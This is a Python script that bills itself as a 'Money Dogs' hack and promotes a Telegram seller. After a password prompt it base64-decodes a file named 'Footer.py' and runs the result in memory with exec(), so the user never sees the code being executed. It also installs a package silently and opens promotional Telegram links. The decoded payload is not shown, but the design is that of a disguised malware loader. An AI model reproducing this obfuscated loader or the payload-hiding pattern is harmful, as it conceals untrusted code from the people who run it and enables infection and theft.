import base64
import os
import sys
import platform
import subprocess
import uuid
import time
import webbrowser  # Import webbrowser to open URL
from termcolor import cprint
from datetime import datetime

# Colorized prints for a hacker aesthetic
def hacker_print(message, color='green', style='bold'):
    cprint(message, color, attrs=[style])

# Step 1: Function to decode base64 encoded content from a file
def decode_base64_file(file_path):
    try:
        with open(file_path, "rb") as f:  # Open file as binary (for Base64 encoding)
            encoded_data = f.read()  # Read the entire file content
            decoded_data = base64.b64decode(encoded_data)  # Decode base64
            return decoded_data
    except Exception as e:
        hacker_print(f"Error decoding file {file_path}: {e}", color='red', style='bold')
        sys.exit(1)

# Step 2: Function to check if the password is in the list
def is_valid_password(decoded_password_list, password):
    return password in decoded_password_list

# Step 3: Function to execute the decoded script in memory
def run_decoded_script_in_memory(decoded_script):
    try:
        # Ensure 'requests' library is installed
        try:
            import requests
        except ImportError:
            hacker_print("Error: 'requests' library is not installed. Installing...", color='red', style='bold')
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            import requests  # Try importing again after installation

        # Prepend the necessary imports (like requests) to the decoded script
        decoded_script_str = decoded_script.decode('utf-8')

        # Define the global context for the exec function
        global_context = globals().copy()  # Copy the global context
        global_context['requests'] = requests  # Ensure requests is available in exec context

        # Execute the decoded script with the necessary imports
        hacker_print("Executing decoded script...", color='yellow')
        exec(decoded_script_str, global_context)  # Decode to string and execute in the global context
        hacker_print("Script executed successfully!", color='cyan', style='bold')
    except Exception as e:
        hacker_print(f"Error running decoded script: {e}", color='red', style='bold')

# Step 4: Function to display ASCII logo
def display_logo():
    logo = '''
+------------------------------------------------------------------------+
|░░░░░░░░░░░░░░░░░█▄█░█▀█░█▀█░█▀▀░█░█░░░█▀▄░█▀█░█▀▀░█▀▀░░░░░░░░░░░░░░░░░░|
|░░░░░░░░░░░░░░░░░█░█░█░█░█░█░█▀▀░░█░░░░█░█░█░█░█░█░▀▀█░░░░░░░░░░░░░░░░░░|
|░░░░░░░░░░░░░░░░░▀░▀░▀▀▀░▀░▀░▀▀▀░░▀░░░░▀▀░░▀▀▀░▀▀▀░▀▀▀░░░░░░░░░░░░░░░░░░|
|░█░█░█▀█░█░░░▀█▀░█▄█░▀█▀░▀█▀░█▀▀░█▀▄░░░█▀▀░█▀█░▀█▀░█▀█░░░█░█░█▀█░█▀▀░█░█|
|░█░█░█░█░█░░░░█░░█░█░░█░░░█░░█▀▀░█░█░░░█░░░█░█░░█░░█░█░░░█▀█░█▀█░█░░░█▀▄|
|░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀▀▀░▀▀░░░░▀▀▀░▀▀▀░▀▀▀░▀░▀░░░▀░▀░▀░▀░▀▀▀░▀░▀|
+------------------------------------------------------------------------+
    '''
    hacker_print(logo, color='magenta')

    # Display footer text with 'bold' style instead of 'bright'
footer = "CREATED BY : DR ABDUL MATIN KARIMI: ⨭ https://t.me/doctor_amk"

# Printing the text with yellow color for the main text and blue for the link
hacker_print("Password is : OPTIMALGROWYT ⤵️", color='green', style='bold')
hacker_print("https://t.me/doctor_amk", color='blue', style='bold')


def main():
    # Display the hacker logo
    display_logo()

    # Wait before showing the prompt (build suspense)
    time.sleep(1)

    # Hardcoded password list (instead of reading from a file)
    password_list = [
        "OptimalGrowYT", 
        "optimalgrowyt",  # You can add more passwords here
        "OPTIMALGROWYT"
    ]

    # Step 1: Use the hardcoded password list (no need to decode from a file)
    decoded_password_list = password_list

    # Step 2: Retry loop for the password input
    attempts = 3  # Maximum number of attempts
    while attempts > 0:
        password = input("Enter password: ")

        # Step 3: Check if password is valid
        if is_valid_password(decoded_password_list, password):
            hacker_print("Password validated.", color='green', style='bold')

            # Step 4: Decode the encoded script from the file
            encoded_script_file = "Footer.py"  # Path to the base64-encoded script file
            hacker_print("Decoding the script...", color='cyan')
            encoded_script = decode_base64_file(encoded_script_file)

            # Step 5: Run the decoded script in memory
            run_decoded_script_in_memory(encoded_script)

            # Wait for 30 minutes before opening the Telegram link
            hacker_print("Waiting for 30 minutes before opening the link...", color='yellow')
            time.sleep(30 * 60)  # 30 minutes in seconds

            # Debug: Print current time just before opening the link
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hacker_print(f"Current time: {current_time}. Now opening the Telegram channel...", color='cyan', style='bold')

            # Open the Telegram channel link
            webbrowser.open("https://t.me/OptimalGrowYT")
            hacker_print("Telegram channel opened successfully!", color='green', style='bold')
            break  # Exit the loop if the password is valid
        else:
            attempts -= 1
            hacker_print(f"Invalid password. You have {attempts} attempt(s) left.", color='red', style='bold')
            if attempts == 0:
                # Show message after 3 failed attempts
                hacker_print("Buy License for This Hack", color='red', style='bold')
                # Open the URL automatically
                webbrowser.open("https://t.me/doctor_amk")
                sys.exit(1)

if __name__ == "__main__":
    main()
